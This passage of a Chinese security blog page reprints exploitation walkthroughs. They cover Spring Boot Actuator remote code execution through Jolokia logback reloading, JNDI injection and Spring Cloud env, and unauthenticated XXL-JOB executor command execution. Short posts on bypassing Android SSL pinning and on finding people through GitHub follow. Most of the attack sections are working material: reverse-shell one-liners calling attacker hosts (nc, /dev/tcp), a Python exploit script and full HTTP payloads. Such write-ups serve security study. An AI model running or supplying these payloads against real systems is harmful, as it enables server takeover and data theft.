-<p>2、把创建的logback.xml和fileread.dtd文件上传到公网vps的web目录下。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/7.jpg" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>3、远程访问logback.xml文件。</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/jolokia/exec/ch.qos.logback.classic:Name=<span class="keyword">default</span>,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/x.x.x.x!/logback.xml</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>成功利用xxe读取到etc&#x2F;passwd文件内容。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/8.jpg" alt="image"></p>
-</blockquote>
-<h3><span id="远程代码执行实现">远程代码执行实现</span></h3><blockquote>
-<p>可以在logback.xml中使用insertFromJNDI标签，这个标签允许我们从 JNDI 加载变量，导致了rce漏洞产生。<br>rce的流程主要分为4步。<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.secshi.com/21506.html">详细过程</a><br>1、构造 Get 请求访问目标，使其去外部服务器加载恶意 logback.xml 文件。<br>2、解析 logback.xml 时，最终会触发 InitialContext.lookup(URI) 操作，而URI 为恶意 RMI 服务地址。<br>3、恶意 RMI 服务器向目标返回一个 Reference 对象，Reference 对象中指定了目标本地存在的 BeanFactory 类，以及Bean Class 的类名、属性、属性值（这里为 ELProcessor 、x、eval(…))。<br>4、目标在进行 lookup() 操作时，会动态加载并实例化 BeanFactory 类，接着调用 factory.getObjectInstance() 方法，通过反射的方式实例化 Reference 所指向的任意 Bean Class，并且会调用 setter 方法为所有的属性赋值。对应我们的代码，最终调用 setter 方法的时候，就是执行如下代码：</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELProcessor.<span class="built_in">eval</span>(\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).<span class="built_in">eval</span>(\&quot;new java.lang.ProcessBuilder[<span class="string">&#x27;(java.lang.String[])&#x27;</span>]([<span class="string">&#x27;/bin/sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc evil-server-ip port &gt;/tmp/f&#x27;</span>]).start()\&quot;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>而 ELProcessor.eval() 会对 EL 表达式（这里为反弹 shell）进行求值，最终达到 RCE 的效果。</p>
-</blockquote>
-<blockquote>
-<p>下载<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://github.com/mpgn/Spring-Boot-Actuator-Exploit">rce利用代码</a>。<br>修改Spring-Boot-Actuator-Exploit\maliciousRMIServer\src\main\java\hello\EvilRMIServer.java的代码。<br>可以修改RMI远程监听的端口，和反弹shell的地址和端口。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/9.jpg" alt="image"><br>使用maven对java代码进行编译打包。<br>进入Spring-Boot-Actuator-Exploit-master&#x2F;maliciousRMIServer目录，执行<code>mvn clean install</code><br>打包成功后创建target目录下生成RMIServer-0.1.0.jar文件。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/10.jpg" alt="image"></p>
-<p><img src="/2023/10/06/Spring-Boot-Actuator-RCE/11.jpg" alt="image"></p>
-</blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">修改logback.xml文件内容。</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;rmi://x.x.x.x:1097/jndi&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>把RMIServer-0.1.0.jar文件上传到公网vps上。<br>执行RMIServer-0.1.0.jar文件,开启攻击机上的RMI监听时需要通过’Djava.rmi.server.hostname&#x3D;x.x.x.x’指定自己的RMI监听的外网地址。<br><code>java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</code><br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/12.jpg" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>vps使用nc监听反弹shell指定的端口。<br><code>nc -lvp 9998</code><br>在漏洞url访问：<br><code>http://x.x.x.x/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!114.x.x.x!/logback.xml</code><br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/13.jpg" alt="image"><br>成功反弹shell。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/14.jpg" alt="image"></p>
-</blockquote>
-<h2><span id="createjndirealm方法">createJNDIRealm方法</span></h2><blockquote>
-<p>相关原理请查看<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://lucifaer.com/2019/03/13/Attack%2520Spring%2520Boot%2520Actuator%2520via%2520jolokia%2520Part%25202/%230x04-%25E6%259E%2584%25E9%2580%25A0poc">Attack Spring Boot Actuator via jolokia Part 2</a><br>查看&#x2F;jolokia&#x2F;list 中存在的是否存在org.apache.catalina.mbeans.MBeanFactory类提供的createJNDIRealm方法，可能存在JNDI注入，导致远程代码执行。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/15.jpg" alt="image"></p>
-<p>利用过程分为五步。<br>1、创建 JNDIRealm<br>2、写入 contextFactory 为 RegistryContextFactory<br>3、写入 connectionURL 为你的 RMI Service URL<br>4、停止 Realm<br>5、启动 Realm 以触发 JNDI 注入</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">可以使用burp一步步重放，也可以直接使用python脚本执行。</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>] + <span class="string">&quot;/jolokia/&quot;</span></span><br><span class="line">pprint(url)</span><br><span class="line"><span class="comment">#创建JNDIRealm</span></span><br><span class="line">create_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:type=MBeanFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;createJNDIRealm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;Tomcat:type=Engine&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入contextFactory</span></span><br><span class="line">set_contextFactory = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;contextFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#写入connectionURL为自己公网RMI service地址</span></span><br><span class="line">set_connectionURL = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;connectionURL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;rmi://x.x.x.x:1097/jndi&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#停止Realm</span></span><br><span class="line">stop_JNDIrealm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;stop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#运行Realm，触发JNDI 注入</span></span><br><span class="line">start = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;start&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">expoloit = [create_JNDIrealm, set_contextFactory, set_connectionURL, stop_JNDIrealm, start]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> expoloit:</span><br><span class="line">    rep = req.post(url, json=i)</span><br><span class="line">    pprint(rep.json())</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>使用之前打包好的jar包-RMIServer-0.1.0.jar，运行RMI服务<br><code>java -Djava.rmi.server.hostname=x.x.x.x -jar RMIServer-0.1.0.jar</code><br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/16.jpg" alt="image"></p>
-<p>使用nc监听反弹的端口<code>nc -lvp 9998</code><br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/17.jpg" alt="image"></p>
-<p>使用python发送请求<code>python exp.py http://x.x.x.x:8087</code><br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/18.jpg" alt="image"></p>
-<p>成功反弹shell。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/19.jpg" alt="image"></p>
-</blockquote>
-<h2><span id="spring-cloud-env">spring Cloud env</span></h2><blockquote>
-<p>当spring boot使用Spring Cloud 相关组件时，会存在spring.cloud.bootstrap.location属性，通过修改 spring.cloud.bootstrap.location 环境变量实现 RCE<br>漏洞原理参考<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/195929">https://www.anquanke.com/post/id/195929</a></p>
-</blockquote>
-<h3><span id="利用范围">利用范围</span></h3><blockquote>
-<p>Spring Boot 2.x 无法利用成功<br>Spring Boot 1.5.x 在使用 Dalston 版本时可利用成功，使用 Edgware 无法成功<br>Spring Boot &lt;&#x3D; 1.4 可利用成功</p>
-</blockquote>
-<h3><span id="利用过程">利用过程</span></h3><blockquote>
-<p>大致原理分为2步。<br>1、利用 &#x2F;env endpoint 修改 spring.cloud.bootstrap.location 属性值为一个外部 yml 配置文件 url 地址，如 <a target="_blank" rel="noopener" href="http://x.x.x.x/yaml-payload.yml">http://x.x.x.x/yaml-payload.yml</a><br>2、请求 &#x2F;refresh endpoint，触发程序下载外部 yml 文件，并由 SnakeYAML 库进行解析，因 SnakeYAML 在反序列化时支持指定 class 类型和构造方法的参数，结合 JDK 自带的 javax.script.ScriptEngineManager 类，可实现加载远程 jar 包，完成任意代码执行。<br>下载使用Michael Stepankin大牛提供的<a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">exp</a><br>更改执行的命令。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/20.jpg" alt="image"></p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将java文件进行编译</span><br><span class="line"></span><br><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>把生成的jar文件挂载到公网http服务器。<br>修改 spring.cloud.bootstrap.location为外部 yml 配置文件地址。</p>
-</blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/env</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>59</span><br><span class="line"> </span><br><span class="line">spring.cloud.bootstrap.location=http://x.x.x.x/yaml-payload.yml</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><img src="/2023/10/06/Spring-Boot-Actuator-RCE/21.jpg" alt="image"></p>
-<p>请求 &#x2F;refresh 接口触发</p>
-</blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8090</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>命令执行成功。<br><img src="/2023/10/06/Spring-Boot-Actuator-RCE/22.jpg" alt="image"></p>
-</blockquote>
-<h2><span id="参考文章">参考文章</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a><br><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a><br><a target="_blank" rel="noopener" href="http://radiosong.cn/index.php/2019/04/03/1.html">http://radiosong.cn/index.php/2019/04/03/1.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4258">https://xz.aliyun.com/t/4258</a><br><a target="_blank" rel="noopener" href="http://r3start.net/index.php/2019/01/20/377">http://r3start.net/index.php/2019/01/20/377</a><br><a target="_blank" rel="noopener" href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit">https://github.com/mpgn/Spring-Boot-Actuator-Exploit</a><br><a target="_blank" rel="noopener" href="https://www.secshi.com/21506.html">https://www.secshi.com/21506.html</a><br><a target="_blank" rel="noopener" href="https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/#0x04-%E6%9E%84%E9%80%A0poc">https://lucifaer.com/2019/03/13/Attack%20Spring%20Boot%20Actuator%20via%20jolokia%20Part%202/#0x04-%E6%9E%84%E9%80%A0poc</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/195929">https://www.anquanke.com/post/id/195929</a><br><a target="_blank" rel="noopener" href="http://vulsee.com/archives/vulsee_2019/1025_9168.html">http://vulsee.com/archives/vulsee_2019/1025_9168.html</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/09/03/XXL-JOB-Executor/">
-                XXL-JOB executor未授权访问漏洞
-            </a>
-        </h2>
-    
-    <time>
-        Sep 3, 2023
-    </time>
-    <section class="content">
-        <h1><span id="xxl-job-executor未授权访问漏洞">XXL-JOB executor未授权访问漏洞</span></h1><h2><span id="漏洞详情">漏洞详情</span></h2><blockquote>
-<p>XXL-JOB是一个轻量级分布式任务调度平台。默认情况下XXL-JOB的Restful API接口或RPC接口没有配置认证措施，未授权的攻击者可构造恶意请求，造成远程执行命令，直接控制服务器。</p>
-</blockquote>
-<h2><span id="漏洞影响">漏洞影响</span></h2><blockquote>
-<p>XXL-JOB &lt;&#x3D; 2.2.0</p>
-</blockquote>
-<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
-<p>XXL-JOB的Restful API分为两种，一个 调度中心Restful API，一个 执行器Restful API。其中在执行器Restful API的任务触发声明中，发送请求的数据格式为：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">地址格式：</span><br><span class="line">    &#123;执行器内嵌服务跟地址&#125;/run 	<span class="comment">//也就是说为executor端的地址，ip:9999/run</span></span><br><span class="line"> </span><br><span class="line">Header： </span><br><span class="line">    XXL-JOB-ACCESS-TOKEN : &#123;请求令牌&#125; 	</span><br><span class="line"> </span><br><span class="line">请求数据格式如下，放置在 RequestBody 中，JSON格式： </span><br><span class="line">&#123; </span><br><span class="line">    <span class="string">&quot;jobId&quot;</span>:<span class="number">1</span>, <span class="comment">// 任务ID </span></span><br><span class="line">    <span class="string">&quot;executorHandler&quot;</span>:<span class="string">&quot;demoJobHandler&quot;</span>, <span class="comment">// 任务标识 </span></span><br><span class="line">    <span class="string">&quot;executorParams&quot;</span>:<span class="string">&quot;demoJobHandler&quot;</span>, <span class="comment">// 任务参数 </span></span><br><span class="line">    <span class="string">&quot;executorBlockStrategy&quot;</span>:<span class="string">&quot;COVER_EARLY&quot;</span>, <span class="comment">// 任务阻塞策略，可选值参考   com.xxl.job.core.enums.ExecutorBlockStrategyEnum </span></span><br><span class="line">    <span class="string">&quot;executorTimeout&quot;</span>:<span class="number">0</span>, <span class="comment">// 任务超时时间，单位秒，大于零时生效 </span></span><br><span class="line">    <span class="string">&quot;logId&quot;</span>:<span class="number">1</span>, <span class="comment">// 本次调度日志ID </span></span><br><span class="line">    <span class="string">&quot;logDateTime&quot;</span>:<span class="number">1586629003729</span>, <span class="comment">// 本次调度日志时间 </span></span><br><span class="line">    <span class="string">&quot;glueType&quot;</span>:<span class="string">&quot;BEAN&quot;</span>, <span class="comment">// 任务模式，可选值参考 com.xxl.job.core.glue.GlueTypeEnum 		&quot;glueSource&quot;:&quot;xxx&quot;, // GLUE脚本代码 </span></span><br><span class="line">    <span class="string">&quot;glueUpdatetime&quot;</span>:<span class="number">1586629003727</span>, <span class="comment">// GLUE脚本更新时间，用于判定脚本是否变更以及是否需要刷新 </span></span><br><span class="line">    <span class="string">&quot;broadcastIndex&quot;</span>:<span class="number">0</span>, <span class="comment">// 分片参数：当前分片 </span></span><br><span class="line">    <span class="string">&quot;broadcastTotal&quot;</span>:<span class="number">0</span> <span class="comment">// 分片参数：总分片 </span></span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">响应数据格式： </span><br><span class="line">    &#123; <span class="string">&quot;code&quot;</span>: <span class="number">200</span>, <span class="comment">// 200 表示正常、其他失败 &quot;msg&quot;: null // 错误提示消息 &#125;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>其中”glueType”:”BEAN” 任务模式的选值如下</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BEAN(<span class="string">&quot;BEAN&quot;</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">GLUE_GROOVY(<span class="string">&quot;GLUE(Java)&quot;</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">GLUE_SHELL(<span class="string">&quot;GLUE(Shell)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;.sh&quot;</span>), </span><br><span class="line">GLUE_PYTHON(<span class="string">&quot;GLUE(Python)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;python&quot;</span>, <span class="string">&quot;.py&quot;</span>), </span><br><span class="line">GLUE_PHP(<span class="string">&quot;GLUE(PHP)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;.php&quot;</span>), </span><br><span class="line">GLUE_NODEJS(<span class="string">&quot;GLUE(Nodejs)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;node&quot;</span>, <span class="string">&quot;.js&quot;</span>), </span><br><span class="line">GLUE_POWERSHELL(<span class="string">&quot;GLUE(PowerShell)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;powershell&quot;</span>, <span class="string">&quot;.ps1&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>也就是说我们可以从中任意选择一种脚本语言，然后在”glueSource”:”xxx”中插入相对应的脚本代码即可执行相对应的命令。</p>
-<p>比如对方如果是linux系统的服务器，那么就可以构造反弹shell命令执行代码为：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;glueType&quot;</span>:<span class="string">&quot;GLUE_SHELLl&quot;</span>，</span><br><span class="line"><span class="string">&quot;glueSource&quot;</span>:<span class="string">&quot;/bin/bash / -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h2><span id="漏洞利用">漏洞利用</span></h2><blockquote>
-<p>访问XXL-JOB存在漏洞版本的客户端（executor），利用burpsuite发送如下payload：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /run HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ip:<span class="number">9999</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 394</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;jobId&quot;: 1,</span></span><br><span class="line"><span class="comment">  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorTimeout&quot;: 0,</span></span><br><span class="line"><span class="comment">  &quot;logId&quot;: 1,</span></span><br><span class="line"><span class="comment">  &quot;logDateTime&quot;: 1586629003729,</span></span><br><span class="line"><span class="comment">  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,</span></span><br><span class="line"><span class="comment">  &quot;glueSource&quot;: &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.30.1/5555 0&gt;&amp;1&quot;,</span></span><br><span class="line"><span class="comment">  &quot;glueUpdatetime&quot;: 1586699003758,</span></span><br><span class="line"><span class="comment">  &quot;broadcastIndex&quot;: 0,</span></span><br><span class="line"><span class="comment">  &quot;broadcastTotal&quot;: 0</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p><img src="/2023/09/03/XXL-JOB-Executor/1.png" alt="image"></p>
-<p>开启监听后，即可反弹回shell</p>
-<p><img src="/2023/09/03/XXL-JOB-Executor/2.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XXL-JOB/" rel="tag">XXL-JOB</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/09/03/Xposed-HTTPS/">
-                夜神模拟器+Xposed框架+JustTrustMe（用来禁用、绕过 SSL 证书检查）来突破SSL Pinning
-            </a>
-        </h2>
-    
-    <time>
-        Sep 3, 2023
-    </time>
-    <section class="content">
-        <h1><span id="夜神模拟器xposed框架justtrustme用来禁用-绕过-ssl-证书检查来突破ssl-pinning">夜神模拟器+Xposed框架+JustTrustMe（用来禁用、绕过 SSL 证书检查）来突破SSL Pinning</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/kai402458953/article/details/99483077">sort浅忆</a> 并作补充</p>
-</blockquote>
-<blockquote>
-<p>1.夜神模拟器官网下载安装 模拟器</p>
-<p>2.创建一个安卓5.1版本的模拟器</p>
-<p><img src="/2023/09/03/Xposed-HTTPS/1.png" alt="image"></p>
-<p>3.把xposed.apk  拖入夜神模拟器 （ Android 5.1.版本，xposed3.1.5 版本） </p>
-<p><img src="/2023/09/03/Xposed-HTTPS/2.png" alt="image"></p>
-<p>4.安装xposed框架</p>
-<p><img src="/2023/09/03/Xposed-HTTPS/3.png" alt="image"></p>
-<p><img src="/2023/09/03/Xposed-HTTPS/4.png" alt="image"></p>
-<p><img src="/2023/09/03/Xposed-HTTPS/5.png" alt="image"></p>
-<p>下载安装完成后， 重启系统</p>
-<p>5.安装JustTrustMe.apk   </p>
-<p>点击“模块”，此时还没有可用的模块，同样的方法点击apk+导入之前下载好的JustTrustMe的apk安装包，系统会自动安装，安装完成后，在模块里面点击“软重启”，再次打开“模块”界面，即可看到JustTrustMe，勾选一下，启用这个模块：</p>
-<p><img src="/2023/09/03/Xposed-HTTPS/6.png" alt="image"></p>
-<p>6.重启生效， 接下载安装 fiddler证书， 设置WLAN代理</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/HTTPS/" rel="tag">HTTPS</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSL/" rel="tag">SSL</a><a class="tag-none-link" href="/tags/Xposed/" rel="tag">Xposed</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/09/03/Github-Find-Email/">
-                如何通过 Github 找到一个人？
-            </a>
-        </h2>
-    
-    <time>
-        Sep 3, 2023
-    </time>
-    <section class="content">
-        <h1><span id="如何通过-github-找到一个人">如何通过 Github 找到一个人？</span></h1><blockquote>
